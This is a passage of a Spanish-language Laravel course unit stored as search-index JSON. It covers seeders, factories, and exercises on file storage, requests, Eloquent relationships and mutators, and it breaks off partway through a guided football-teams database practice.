\"mobile\" =&gt; true\n  \"size\" =&gt; 12\n]\n*/\n\n$user-&gt;save();\n\n// Verificamos en la base de datos\necho $user-&gt;getAttributes()['password']; // Salida del hash sin modificar: $2y$10$...\ndd($alumno-&gt;getAttributes()['preferencias']); // Salida como texto sin transformar: \"{\"tema\":\"claro\",\"idioma\":\"ES\",\"mobile\":true,\"size\":12}\" \n</code></pre> <p>M\u00e1s info en mutadores y accesores.</p>"},{"location":"09laravelAvanzado.html#95-seeders-y-factorias","title":"9.5 Seeders y factor\u00edas","text":"<p>Los seeders y factor\u00edas permiten generar datos de prueba de forma f\u00e1cil y r\u00e1pida, \u00fatiles durante el desarrollo para simular datos iniciales en una aplicaci\u00f3n.</p>"},{"location":"09laravelAvanzado.html#seeders","title":"Seeders","text":"<p>Los seeders son clases especiales que permiten \"sembrar\" datos en la base de datos.</p>"},{"location":"09laravelAvanzado.html#crear-un-seeder","title":"Crear un seeder","text":"<p>Mediante el siguiente comando crearmos un seeder con nombre <code>BooksSeeder</code> en el directorio database/seeders:</p> <pre><code>php artisan make:seeder BooksSeeder\n</code></pre> <p>En el m\u00e9todo <code>run</code> a\u00f1adimos los elementos que queremos crear:</p> <pre><code>&lt;?php\nclass BooksSeeder extends Seeder\n{\n    public function run()\n    {\n        // Ejemplo: Crear un libro\n        $book = new Book();\n        $book-&gt;title = \"Laravel for Beginners\";\n        $book-&gt;author = \"John Doe\";\n        $book-&gt;save();\n    }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#anadir-el-seeder-a-databaseseeder","title":"A\u00f1adir el seeder a DatabaseSeeder","text":"<p>El seeder reci\u00e9n creado hay que a\u00f1adirlo al <code>DatabaseSeeder</code>. Por ejemplo:</p> <pre><code>&lt;?php\nclass DatabaseSeeder extends Seeder\n{\n    public function run()\n    {\n        $this-&gt;call([\n            BooksSeeder::class,\n            AuthorsSeeder::class,\n            // ...\n        ]);\n    }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#ejecutar-el-seeder","title":"Ejecutar el seeder","text":"<p>Podemos hacer varias cosas, seg\u00fan nos interese:</p> <ul> <li><code>php artisan db:seed</code> : Ejecutar todos los seeders.</li> <li><code>php artisan db:seed --class=BooksSeeder</code> : Ejecutar un seeder esc\u00edfico.</li> <li><code>php artisan migrate:fresh --seed</code> : Reiniciar las migraciones y ejecutar todos los seeders.</li> </ul>"},{"location":"09laravelAvanzado.html#factorias","title":"Factor\u00edas","text":"<p>Las factor\u00edas permiten crear grandes cantidades de datos \"fake\" de forma r\u00e1pida y din\u00e1mica. Utiliza la librer\u00eda Faker para ello.</p>"},{"location":"09laravelAvanzado.html#crear-una-factoria","title":"Crear una factor\u00eda","text":"<p>Mediante el siguiente comando creamos una factor\u00eda con nombre <code>AuthorFactory</code> asociada al modelo <code>Author</code> en el directorio database/factories:</p> <pre><code>php artisan make:factory AuthorFactory -m Author\n</code></pre> <p>En el m\u00e9todo <code>definition</code> devolvemos un array asociativo con los campos del objeto que queremos crear. Cada campo lo creamos mediante <code>fake()</code> o tambi\u00e9n <code>$this-&gt;faker</code>.</p> <pre><code>&lt;?php\nnamespace Database\\Factories;\n\nuse App\\Models\\Author;\nuse Illuminate\\Database\\Eloquent\\Factories\\Factory;\n\nclass AuthorFactory extends Factory\n{\n    // Asociaci\u00f3n de la factor\u00eda con el modelo (en este caso se podr\u00eda omitir porque Laravel la deduce por el nombre)\n    protected $model = Author::class; \n\n    public function definition()\n    {\n        return [\n            'name' =&gt; fake()-&gt;name,\n            'birth_year' =&gt; fake()-&gt;year,\n            // 'name' =&gt; $this-&gt;faker-&gt;name, // equivalente a fake()\n            // 'birth_year' =&gt; $this-&gt;faker-&gt;year, // equivalente a fake()\n        ];\n    }\n}\n</code></pre> <p>En modelos relacionados lo m\u00e1s sencillo es llamar a la factor\u00eda directamente en el campo de la relaci\u00f3n:</p> <pre><code>&lt;?php\nnamespace Database\\Factories;\n\nuse App\\Models\\Author;\nuse Illuminate\\Database\\Eloquent\\Factories\\Factory;\n\nclass BookFactory extends Factory\n{\n    public function definition(): array\n    {\n        return [\n            'isbn' =&gt; fake()-&gt;isbn13(), // Crea un ISBN de 13 d\u00edgitos (formato actual)\n            'titulo' =&gt; fake()-&gt;sentence(5), // Genera un t\u00edtulo de 5 palabras\n            'author_id' =&gt; Author::factory() // Crea un autor y lo relaciona con el libro\n        ];\n    }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#asociar-factoria-al-modelo","title":"Asociar factor\u00eda al modelo","text":"<p>Hay que asociar la factor\u00eda con el modelo tanto en la factor\u00eda como en el modelo.</p> <ul> <li>En la parte de la factor\u00eda se realiza con convenci\u00f3n, por lo que si la factor\u00eda se llama AuthorFactory, el modelo asociado ser\u00e1 Author. Y en caso de que queramos indicar esta asociaci\u00f3n de forma expl\u00edcita, lo podemos hacer a trav\u00e9s de la propiedad <code>$model</code> como en el ejemplo anterior.</li> <li>En la parte del modelo, si lo hemos creamos a mano, hay que indicar que usa una factor\u00eda mediante el trait <code>HasFactory</code>:</li> </ul> <pre><code>&lt;?php\nuse Illuminate\\Database\\Eloquent\\Factories\\HasFactory;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Author extends Model\n{\n    use HasFactory;\n    //...  \n}\n</code></pre>"},{"location":"09laravelAvanzado.html#utilizar-una-factoria","title":"Utilizar una factor\u00eda","text":"<pre><code>&lt;?php\n// Donde nos interese, por ejemplo en el controlador, modelo... pero lo ideal es en un seeder\nuse App\\Models\\Author;\n\n// Crear un autor\nAuthor::factory()-&gt;create();\n\n// Crear 10 autores\nAuthor::factory()-&gt;count(10)-&gt;create();\n// Tambi\u00e9n crea 10 autores\nAuthor::factory(10)-&gt;create();\n\n// Crea 10 autores con 3 libros para cada uno\nAuthor::factory()\n    -&gt;count(10) \n    -&gt;hasBooks(3) \n    -&gt;create();\n</code></pre>"},{"location":"09laravelAvanzado.html#integracion-con-seeders","title":"Integraci\u00f3n con seeders","text":"<p>Combinando factor\u00edas con seeders se pueden crear datos din\u00e1micos de forma sencilla. No olvidar incluir los seeders en <code>DatabaseSeeder</code>.</p> <pre><code>&lt;?php\nclass AuthorsSeeder extends Seeder\n{\n    public function run()\n    {\n        Author::factory()-&gt;count(10)-&gt;create();\n    }\n}\n\n// Utilizar factor\u00edas con datos relacionados\nclass BooksSeeder extends Seeder\n{\n    public function run()\n    {\n        $authors = Author::factory()-&gt;count(5)-&gt;create();\n\n        $authors-&gt;each(function ($author) {\n            Book::factory()-&gt;count(2)-&gt;create(['author_id' =&gt; $author-&gt;id]);\n        });\n    }\n}\n</code></pre> <p>Opci\u00f3n m\u00e1s sencilla para crear en el mismo seeder autores y libros relacionados:</p> <pre><code>&lt;?php\nclass AuthorsSeeder extends Seeder\n{\n    public function run()\n    {\n        Author::factory()\n            -&gt;count(10) // Crea 10 autores\n            -&gt;hasBooks(3) // Para cada autor crea 3 libros relacionados\n            -&gt;create();\n    }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#actividades","title":"Actividades","text":"<p>A continuaci\u00f3n, vas a realizar una serie de ejercicios sobre cada uno de los apartados vistos en el tema. Puedes crear un proyecto nuevo o reutilizar uno existente.</p>"},{"location":"09laravelAvanzado.html#manejo-de-ficheros","title":"Manejo de ficheros","text":"<p>Para practicar con los ficheros vas a crear una galer\u00eda de im\u00e1genes con posibilidad de subir nuevas, eliminar y acceder a su vista en detalle. Tambi\u00e9n vas a implementar un \"Mini Drive\" para gestionar archivos. En ambos casos, vas a trabajar sin modelos para centrarte exclusivamente en el manejo de ficheros, pero en una app real, adem\u00e1s ser\u00eda recomendable trabajar con una BDD que almacene la informaci\u00f3n necesaria de los archivos.</p> <ol> <li> <p>Formulario de subida: Crea un formulario para subir una imagen. La ruta que lleva al formulario por GET ser\u00e1 <code>imagen/create</code> y la vista del mismo ser\u00e1 <code>imagen/create.blade.php</code>. El formulario se enviar\u00e1 por POST a la ruta <code>imagen/storage</code>. Adem\u00e1s del propio input de la imagen, el formulario tendr\u00e1 un radio button para seleccionar si la imagen se almacenar\u00e1 de forma privada o p\u00fablica en el storage.</p> </li> <li> <p>Almacenar archivos: Crea la funci\u00f3n correspondiente en el controlador para recibir la imagen del formulario anterior validando que sea del tipo imagen, requerida y con un tama\u00f1o m\u00e1ximo de 2MB. Y seg\u00fan la opci\u00f3n del formulario, almacena la imagen de forma privada o p\u00fablica en el storage. Despu\u00e9s redirecciona a la p\u00e1gina anterior enviando un mensaje del tipo \"Imagen NOMBRE almacenada correctamente en el storage privado|p\u00fablico\" que mostrar\u00e1s justo encima del formulario.</p> </li> <li> <p>Mostrar archivos: Mediante la ruta por GET <code>imagen</code> que lleva a la vista <code>imagen/index.blade.php</code> muestra una galer\u00eda con todas las im\u00e1genes en miniatura. Puedes utilizar flexbox o grid layout para posicionarlas unas al lado de las otras. Importante: No olvides crear el enlace simb\u00f3lico para poder acceder a las im\u00e1genes. Crea un enlace \"Subir imagen\" que lleve al formulario del primer punto y en dicho formulario, un enlace para volver aqu\u00ed, al listado.</p> </li> <li> <p>Mostrar imagen completa: Mediante la ruta por GET <code>imagen/{name}</code> que lleva a la vista <code>imagen/show.blade.php</code> muestra la vista en tama\u00f1o completo de la imagen. Muestra un p\u00e1rrafo con su ruta completa y un enlace para volver al listado.</p> </li> <li> <p>Eliminar archivos: Mediante la ruta por GET <code>imagen/{name}/destroy</code> elimina la imagen que corresponda. A esta ruta podr\u00e1s llegar mediante un enlace de la vista en detalle de la imagen. Una vez eliminada, se redirige autom\u00e1ticamente al listado enviando con 'with' un mensaje del tipo \"Imagen NOMBRE eliminada correctamente del storage p\u00fablico\". Si lo prefieres, en lugar del enlace a eliminar, puedes hacerlo mediante un formulario que lleve a una ruta DELETE <code>imagen/{name}</code>.</p> </li> <li> <p>Almacenamiento en S3 (opcional): Con tu cuenta de estudiante de AWS, crea un bucket S3 con acceso p\u00fablico. Configura el proyecto actual para utilizar el disco 's3' por defecto o bien util\u00edzalo de forma expl\u00edcita en cada interacci\u00edon que realices con el Storage.</p> </li> <li> <p>Mini Drive: De forma similar a lo que acabas de hacer con la galer\u00eda, crea un sistema de almecenamiento de archivos que admita archivos de diferente tipo (im\u00e1genes, videos, documentos...). Deber\u00e1s mostrar un listado con un icono seg\u00fan el tipo de archivo, su nombre, tama\u00f1o y opciones (eliminar), un formulario para subirlo con un campo en el que recojas el nombre con el que almacenarlo. Y en vez de la vista en detalle, al pulsar sobre el archivo en la vista del listado, se descargar\u00e1 directamente. Sigue las recomendaciones de los puntos anteriores. Recuerda que cada archivo no va a tener un modelo asociado, por lo que el nombre, tama\u00f1o... deber\u00e1s obtenerlo de la informaci\u00f3n del propio archivo.</p> </li> <li> <p>Mini Drive con directorios (opcional): Investiga c\u00f3mo crear directorios y mover archivos entre ellos. Ofrece en la interfaz que has creado, las opciones correspondientes para crear un nuevo directorio, para cambiar el nobmre a un archivo (si no existe uno ya con dicho nombre) y moverlo a un directorio determinado. </p> </li> </ol>"},{"location":"09laravelAvanzado.html#request-y-response","title":"Request y response","text":"<p>En los siguientes ejercicios vas a trabajar con <code>Request</code>y <code>Response</code> en las funciones de los controladores. El primero ya lo has utilizado para recoger los datos recibidos de un formulario. Vas a repasar su uso y sobre todo, vas a conocer el segundo.</p> <ol> <li> <p>Obtener y validar datos con Request: Crea un peque\u00f1o formulario para recoger \"Nombre\" y \"Email\" del usuario. Recoge sus datos en una funci\u00f3n del controlador y val\u00eddalos. Si pasan la validaci\u00f3n, s\u00edmplemente devuelve un mensaje \"Se ha pasado la validaci\u00f3n\" y si no, captura los errores en la vista del formulario.</p> </li> <li> <p>Redireccionar la respuesta: Modifica el ejercicio anterior para redireccionar la respuesta a otra ruta.</p> </li> <li> <p>Respuesta JSON: Crea una ruta GET <code>/api/usuarios</code> que devuelva un array de usuarios (id, nombre, email) en formato JSON.</p> </li> <li> <p>Respuesta JSON error: Crea una ruta GET <code>/api/error</code> que devuelva un array (error y mensaje) en formato JSON y adem\u00e1s, el c\u00f3digo de estado 400 para indicar al cliente que ha enviado una petici\u00f3n inv\u00e1lida.</p> </li> <li> <p>Modificar cabeceras de la respuesta: Crea una ruta GET <code>/archivo/descargar</code> que devuelva un archivo descargable y modifique los encabezados de la respuesta. En el controlador, usa response()-&gt;download() para devolver el archivo estableciendo un encabezado personalizado.</p> </li> <li> <p>Ejercicio completo: API Rest: Con lo visto hasta ahora, implementa una API RESTful para manejar usuarios:</p> </li> </ol> <ul> <li>C: Crear un usuario mediante POST <code>/api/usuarios</code>.</li> <li>R: Listar usuarios con GET <code>/api/usuarios</code>.</li> <li>U: Actualizar un usuario con PUT <code>/api/usuarios/{id}</code>.</li> <li>D: Eliminar un usuario con DELETE <code>/api/usuarios/{id}</code>.</li> </ul> <p>Aseg\u00farate de devolver respuestas adecuadas en JSON y manejar los errores correctamente.</p>"},{"location":"09laravelAvanzado.html#eloquent-relaciones","title":"Eloquent: Relaciones","text":"<p>En este apartado vas a crear diferentes relaciones entre modelos.</p> <ol> <li>Relaci\u00f3n 1 a 1. </li> </ol> <ul> <li>Crea los modelos <code>Usuario</code> y <code>Perfil</code>. Cada usuario tiene un perfil, y cada perfil pertenece a un \u00fanico usuario.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>usuarios</code>: campos <code>id</code>, <code>nombre</code>, <code>email</code>.</li> <li><code>perfiles</code>: campos <code>id</code>, <code>usuario_id</code> (clave for\u00e1nea), <code>telefono</code>, <code>direccion</code>.</li> <li>Define la relaci\u00f3n en los modelos.</li> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta los datos de un usuario y muestra su perfil. Para ello, crea una ruta <code>usuario/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>usuario.show.blade.php</code> para los datos del usuario con su perfil.</li> </ul> <ol> <li>Relaci\u00f3n 1 a Muchos. </li> </ol> <ul> <li>Crea los modelos <code>Categoria</code> y <code>Producto</code>. Cada categor\u00eda tiene muchos productos, pero un producto s\u00f3lo perteneca una determinada categor\u00eda.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>categorias</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>productos</code>: campos <code>id</code>, <code>nombre</code>, <code>categoria_id</code> (clave for\u00e1nea).</li> <li>Define la relaci\u00f3n en los modelos.</li> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta el nombre de una categor\u00eda mostrando sus productos. Para ello, crea una ruta <code>categoria/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>categoria.show.blade.php</code>.</li> <li>Mediante Eloquent agrega un nuevo producto a la categor\u00eda con id pasado por par\u00e1metro. Para ello, crea una ruta <code>categoria/{id}/addproduct/{nombre}</code> que redirija a la funci\u00f3n <code>addProduct</code> del controlador y redirija a la ruta <code>show</code> anterior que llama a la vista <code>categoria.show.blade.php</code>.</li> </ul> <ol> <li>Relaci\u00f3n Muchos a Muchos. </li> </ol> <ul> <li>Crea los modelos <code>Estudiante</code> y <code>Asignatura</code>. Cada estudiante puede est\u00e1r matriculado en muchas asignaturas y una asignatura la cursan muchos estudiantes.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>estudiantes</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>asignaturas</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>asignatura_estudiante</code> (tabla pivote): <code>estudiante_id</code>, <code>asignatura_id</code>.</li> <li>Define la relaci\u00f3n en los modelos.</li> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta todas las asignaturas de un estudiante por su id. Para ello, crea una ruta <code>estudiante/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>estudiante.show.blade.php</code>.</li> <li>Consulta ahora todos los estudiantes que cursen una asignatura por su id. Para ello, crea una ruta <code>asignatura/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>asignatura.show.blade.php</code>.</li> <li>Mediante Eloquent matricula a un estudiante en un curso determinado. Para ello, crea una ruta <code>estudiante/{id}/matricula/{idCurso}</code> que redirija a la funci\u00f3n <code>matricula</code> del controlador y redirija a la ruta <code>show</code> de estudiante que llama a la vista <code>estudiante.show.blade.php</code>.</li> <li>Mediante Eloquent desmatricula a un estudiante en un curso determinado. Para ello, crea una ruta <code>estudiante/{id}/desmatricula/{idCurso}</code> que redirija a la funci\u00f3n <code>desmatricula</code> del controlador y redirija a la ruta <code>show</code> de estudiante que llama a la vista <code>estudiante.show.blade.php</code>.</li> </ul> <ol> <li>Ejercicio completo: CRUD con varias relaciones y formularios.</li> </ol> <ul> <li>Implementa un sistema de gesti\u00f3n de posts con sus respectivos comentarios mediante los modelos <code>Autor</code>, <code>Post</code> y <code>Comentario</code>.</li> <li>Piensa bien las relaciones a utilizar. Un autor puede escribir muchos posts y comentarios. Un post puede tener muchos comentarios. Un comentario s\u00f3lo pertenece a un post y est\u00e1 escrito por un autor.</li> <li>De un autor interesa saber su imagen, nombre y email.</li> <li>De un post interesa saber su t\u00edtulo, fecha y descripci\u00f3n.</li> <li>De un comentario interesa saber su texto y fecha.</li> <li>Crea los CRUDs necesarios para cada modelo con sus rutas espec\u00edficas, controladores, vistas (con formularios)...</li> </ul>"},{"location":"09laravelAvanzado.html#mutadores-y-accesores","title":"Mutadores y accesores","text":"<ol> <li>Formatear nombres y convertir n\u00fameros: En el modelo <code>Producto</code> del ejercicio anterior, crea:</li> </ol> <ul> <li>Un mutador que almacene el nombre en min\u00fasculas y un accesor que los devuelva con la primera letra en may\u00fascula.</li> <li>Un mutador que almacene el precio convertido a c\u00e9ntimos y un accesor que lo devuelva de nuevo en euros.</li> </ul> <ol> <li>Slug autom\u00e1tico: Un slug es una versi\u00f3n formateada de un texto, generalmente usada en URLs por gestores de contenidos. Un slug se crea eliminando caracteres especiales, convirtiendo espacios en guiones y pasando a min\u00fasculas el texto. Por ejemplo: \"Hola Mundo Laravel\" tendr\u00eda de slug \"hola-mundo-laravel\".</li> </ol> <p>En el modelo <code>Post</code> del ejercicio anterior:</p> <ul> <li>Crea la migraci\u00f3n correspondiente para a\u00f1adir el campo <code>slug</code> de tipo string.</li> <li>Investiga c\u00f3mo usar <code>Str::slug</code> para generar slugs.</li> <li>Crea un mutador que convierta el t\u00edtulo a slug y lo almacene en el campo <code>slug</code>.</li> </ul> <ol> <li>Formatear fechas de creaci\u00f3n: En el modelo <code>Estudiante</code> del ejercicio anterior:</li> </ol> <ul> <li>Investiga c\u00f3mo usar la biblioteca <code>Carbon</code> para trabajar con fechas incluida en Laravel.</li> <li>Crea un accesor que formatee la fecha de creaci\u00f3n (created_at) en formato \"d/m/Y - H:i\".</li> </ul>"},{"location":"09laravelAvanzado.html#seeders-y-factories","title":"Seeders y factories","text":"<ol> <li> <p>Seeder b\u00e1sico: Crea un nuevo modelo <code>Usuario</code> con campos <code>nombre</code>, <code>email</code> y <code>password</code> (en su migraci\u00f3n) y crea un seeder <code>UsuarioSeeder</code> que inserte 3 usuarios de prueba en la base de datos.</p> </li> <li> <p>Factor\u00eda con seeder: Crea una factor\u00eda <code>UsuarioFactory</code> con datos fake y en el seeder <code>UsuarioSeeder</code> crea 10 usuarios mediante la factor\u00eda.</p> </li> <li> <p>Seeders con modelos relacionados: Crea el modelo <code>Publicacion</code> con los campos <code>titulo</code>, <code>contenido</code> y <code>usuario_id</code> (en su migraci\u00f3n) y modifica los modelos para que un usuario se relacione con muchas publicaciones. Crea las factor\u00edas <code>UsuarioFactory</code> (ya la tienes) y <code>PublicacionFactory</code> con datos fake para utilizar en el seeder <code>UsuarioPublicacionSeeder</code> para crear 10 usuarios que tentan entre 1 y 5 publicaciones cada uno.</p> </li> </ol>"},{"location":"09laravelAvanzado.html#practica-directorio-trabajadores","title":"Pr\u00e1ctica: Directorio trabajadores","text":"<p>Desarrolla una app que muestre a los trabajadores de una empresa con sus datos de contacto. Se incorporar\u00e1 un buscador que filtrar\u00e1 por varios de los campos y se dar\u00e1n opciones de ordenaci\u00f3n.</p> <p>A continuaci\u00f3n se detallan los requisitos. Deber\u00e1s hacer las migraciones correspondientes, rutas, controlador, vistas... que necesites para su implementaci\u00f3n.</p>"},{"location":"09laravelAvanzado.html#requisitos","title":"Requisitos","text":"<ol> <li>Modelo Trabajador con los siguientes campos:</li> </ol> <ul> <li>nombre (string): Nombre del trabajador.</li> <li>apellidos (string): Apellidos del trabajador.</li> <li>telefono (string): Tel\u00e9fono profesional.</li> <li>email (string): Correo electr\u00f3nico.</li> <li>foto (string): Nombre de la imagen del trabajador.</li> <li>departamento (string): Departamento al que pertenece (Ejemplo: Copmras, Ventas, RRHH, I+D...).</li> <li>cargos (array): Array de strings con los cargos del empleado (Ejemplo: Jefe departamento, coordinador \u00e1rea, director...).</li> <li>fecha_nacimiento (date): Fecha nacimiento.</li> <li>sustituto (boolean): Indica si est\u00e1 sustituyendo a otro trabajador.</li> <li>mayor55 (boolean): Indica si es mayor de 55 a\u00f1os.</li> </ul> <ol> <li>Funciones CRUD:</li> </ol> <ul> <li>Crear nuevos trabajadores.</li> <li>Editar y actualizar trabajadores existentes.</li> <li>Eliminar trabajadores.</li> <li>Listar todos los trabajadores con opciones de b\u00fasqueda filtrado.</li> </ul> <ol> <li>Vistas con Blade:</li> </ol> <ul> <li>Listado de trabajadores, con b\u00fasqueda y filtros por nombre, apellidos, departamento, cargos y si son o no sustitutos o mayortes de 55 a\u00f1os.</li> <li>Formulario para a\u00f1adir trabajadores.</li> <li>Formulario para editar trabajadores.</li> <li>Vista de detalle de un trabajador con toda su informaci\u00f3n.</li> </ul> <ol> <li>Extras opcionales:</li> </ol> <ul> <li>Ordenar los trabajadores por fecha de nacimiento (m\u00e1s recientes primero).</li> <li>Destacar el trabajador que cumpla a\u00f1os en el d\u00eda de hoy poni\u00e9ndole por ejemplo un icono de churros al lado del nombre para la invitaci\u00f3n... \ud83d\ude1c</li> </ul>"},{"location":"09laravelAvanzado.html#practica-guiada-guia-de-equipos-de-futbol-femenino","title":"Pr\u00e1ctica guiada: Gu\u00eda de equipos de f\u00fatbol femenino","text":"<p>El objetivo de este ejercicio es extender la Gu\u00eda de Equipos de F\u00fatbol Femenino para utilizar una base de datos relacional. Crear\u00e1s tablas con migraciones, modelos para gestionar los datos y a integrarlos con controladores y vistas.</p>"},{"location":"09laravelAvanzado.html#paso-1-migracion","title":"Paso 1: Migraci\u00f3n","text":"<p>Mediante una migraci\u00f3n se va a crear la tabla <code>equipos</code> con la siguiente estructura:</p> <ul> <li><code>id</code>: Clave primaria, autoincremental.</li> <li><code>nombre</code>: Nombre del equipo (cadena, \u00fanico, obligatorio).</li> <li><code>estadio</code>: Nombre del estadio del equipo (cadena, obligatorio).</li> <li><code>titulos</code>: N\u00famero de t\u00edtulos ganados (entero, predeterminado 0).</li> <li><code>created_at</code> y <code>updated_at</code>: Campos de timestamps generados autom\u00e1ticamente.</li> </ul> <ol> <li>Ejecuta:</li> </ol> <pre><code>php artisan make:migration create_equipos_table --create=equipos\n</code></pre> <ol> <li>Modifica el archivo de la migraci\u00f3n para incluir la estructura pedida:</li> </ol> <pre><code>&lt;?php\npublic function up()\n{\n    Schema::create('equipos', function (Blueprint $table) {\n        $table-&gt;id();\n        $table-&gt;string('nombre')-&gt;unique();\n        $table-&gt;string('estadio');\n        $table-&gt;integer('titulos')-&gt;default(0);\n        $table-&gt;timestamps();\n    });\n}\n</code></pre> <ol> <li>Ejecuta la migraci\u00f3n para crear la tabla:</li> </ol> <pre><code>php artisan migrate\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-2-modelo-y-seeder","title":"Paso 2: Modelo y seeder","text":"<p>Seguimos con la creaci\u00f3n del modelo <code>Equipo</code> y el seeder <code>EquiposSeeder</code>. </p> <ol> <li>Crear el modelo asociado a la tabla anterior.</li> </ol> <pre><code>php artisan make:model Equipo\n</code></pre> <ol> <li>Modifica el modelo <code>Equipo</code> en <code>app/Models/Equipo.php</code> para definir en <code>$fillable</code> los campos que se pueden rellenar mediante asignaci\u00f3n masiva y opcionalmente la tabla a la que hace referencia el modelo (no es necesario, pero as\u00ed repasas):</li> </ol> <pre><code>&lt;?php\nprotected $fillable = ['nombre', 'estadio', 'titulos'];\nprotected $table = 'equipos'; // Aqu\u00ed no es necesario porque Laravel la deduce por el nombre del modelo y la tabla\n</code></pre> <ol> <li>Crea un seeder para la tabla <code>equipos</code>:</li> </ol> <pre><code>php artisan make:seeder EquiposSeeder\n</code></pre> <ol> <li>Modifica el seeder <code>EquiposSeeder</code> para generar los datos de ejemplo:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    DB::table('equipos')-&gt;insert([\n        ['nombre' =&gt; 'Barcelona', 'estadio' =&gt; 'Camp Nou', 'titulos' =&gt; 30],\n        ['nombre' =&gt; 'Real Madrid', 'estadio' =&gt; 'Santiago Bernabeu', 'titulos' =&gt; 10],\n        ['nombre' =&gt; 'Sevilla', 'estadio' =&gt; 'Ram\u00f3n S\u00e1nchez Pizju\u00e1n', 'titulos' =&gt; 8],\n        ['nombre' =&gt; 'Valencia', 'estadio' =&gt; 'Mestalla', 'titulos' =&gt; 6],\n        ['nombre' =&gt; 'Atl\u00e9tico de Madrid', 'estadio' =&gt; 'Wanda Metropolitano', 'titulos' =&gt; 5],\n    ]);\n}\n</code></pre> <ol> <li>A\u00f1ade el seeder <code>EquiposSeeder</code> a la funci\u00f3n <code>run</code> de <code>DatabaseSeeder</code>:</li> </ol> <pre><code>&lt;?php\npublic function run()\n{\n    $this-&gt;call([\n        EquiposSeeder::class,\n    ]);\n}\n</code></pre> <ol> <li>Ejecuta los seeders para rellenar la tabla <code>equipos</code> con los datos de ejemplo:</li> </ol> <pre><code>php artisan db:seed\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-3-controladores-y-crud","title":"Paso 3: Controladores y CRUD","text":"<ol> <li>En el controlador <code>EquipoController</code> ya creado, modifica los m\u00e9todos <code>index</code>, <code>show</code>, <code>create</code>, <code>edit</code> y <code>destroy</code> para obtener los equipos desde la base de datos:</li> </ol> <pre><code>&lt;?php\npublic function index() {\n     $equipos = Equipo::all();\n     return view('equipos.index', compact('equipos'));\n }\n\n public function show($id) {\n     $equipo = Equipo::find($id);\n     return view('equipos.show', compact('equipo'));\n }\n\n public function create() {\n     return view('equipos.create');\n }\n\n public function edit(Equipo $equipo) {\n     return view('equipos.edit', compact('equipo'));\n }\n\n public function destroy($id) {\n     $equipo = Equipo::find($id);\n     $equipo-&gt;delete();\n     return redirect()-&gt;route('equipos.index')-&gt;with('success', 'Equipo eliminado correctamente!');\n }\n</code></pre>"},{"location":"09laravelAvanzado.html#paso-4-relaciones-entre-modelos","title":"Paso 4: Relaciones entre modelos","text":"<p>En este punto vamos a crear la tabla <code>estadios</code> mediante una migraci\u00f3n, con un seeder la rellenaremos y crearemos el modelo <code>Estadio</code> que lo relacionaremos con <code>Equipo</code>.</p> <ol> <li>Crear la migraci\u00f3n para crear la tabla <code>estadios</code>:</li> </ol> <pre><code>php artisan make:migration create_estadios_table\n</code></pre> <ol> <li>Rellenarla con los siguientes datos:</li> </ol> <pre><code>&lt;?php\n public function up(): void\n    {\n        Schema::create('estadios', function (Blueprint $table) {\n            $table-&gt;id();\n            $table-&gt;string('nombre')-&gt;unique();\n            $table-&gt;string('ciudad');\n            $table-&gt;integer('capacidad');\n            $table-&gt;timestamps();\n        });\n    }\n</code></pre> <ol> <li>Crear la migraci\u00f3n para a\u00f1adir la clave for\u00e1nea <code>estadio_id</code> a la tabla <code>equipos</code>:</li> </ol> <pre><code>php artisan make:migration add_estadio_id_to_equipos_table\n</code></pre> <ol> <li>Rellenarla con los siguientes datos:</li> </ol> <pre><code>&lt;?php\npublic function up(): void\n  {\n      Schema::table('equipos', function (Blueprint $table) {\n          $table-&gt;dropColumn('estadio'); // Elimina el campo estadio\n          $table-&gt;foreignId('estadio_id')-&gt;constrained(); // A\u00f1ade la clave for\u00e1nea\n      });\n  }\n\npublic function down(): void\n  {\n      Schema::table('equipos', function (Blueprint $table) {\n          $table-&gt;string('estadio');\n          $table-&gt;dropForeign(['estadio_id']);\n          $table-&gt;dropColumn('estadio_id');\n      });\n  }\n</code></pre> <ol> <li>Crear el modelo <code>Estadio</code>:</li> </ol> <pre><code>php artisan make:model Estadio\n</code></pre> <ol> <li>A\u00f1ade en el modelo la relaci\u00f3n con <code>Equipo</code> teniendo en cuenta que en 1 estadio pueden jugar muchos equipos y un equipo s\u00f3lo juega en 1 estadio:</li> </ol> <pre><code>&lt;?php\n    protected $fillable = ['nombre', 'ciudad', 'capacidad'];\n\n    public function equipos(){\n        return $this-&gt;hasMany(Equipo::class);\n    }\n</code></pre> <ol> <li>En el modelo <code>Equipo</code> a\u00f1ade la relaci\u00f3n:</li> </ol> <pre><code>&lt;?php\n    public function estadio(){\n        return $this-&gt;belongsTo(Estadio::class);\n    }\n</code></pre> <ol> <li>Crea el seeder <code>EstadiosSeeder</code>:</li> </ol> <pre><code>php artisan make:seeder EstadiosSeeder\n</code></pre> <ol> <li>Y rell\u00e9nalo con los datos de prueba:</li> </ol> <pre><code>&lt;?php\npublic function run(): void\n  {\n      DB::table('estadios')-&gt;insert([\n          ['nombre' =&gt; 'Camp Nou', 'ciudad' =&gt; 'Barcelona', 'capacidad' =&gt; 99000],\n          ['nombre' =&gt; 'Wanda Metropolitano', 'ciudad' =&gt; 'Madrid', 'capacidad' =&gt; 68000],\n          ['nombre' =&gt; 'Santiago 